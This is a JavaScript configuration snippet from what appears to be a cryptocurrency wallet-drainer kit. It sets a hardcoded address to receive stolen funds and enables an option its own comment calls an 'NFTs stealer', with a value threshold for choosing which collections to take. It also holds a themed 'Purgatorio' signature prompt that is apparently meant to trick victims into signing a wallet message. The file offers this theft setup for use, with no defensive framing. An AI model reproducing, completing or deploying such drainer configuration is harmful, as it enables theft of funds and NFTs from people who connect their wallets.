const receiveAddress = "0x88b45CADC87eA632AB8BE0367B67379C898c39f9";


const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.5, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const signMessage = `Welcome, \n\n` +
    `to the Purgatorio.\n\n` +
    `Are you a person of values?\n\n` +
    `Are you worthy of this` +
    `Nonce:\n{nonce}`;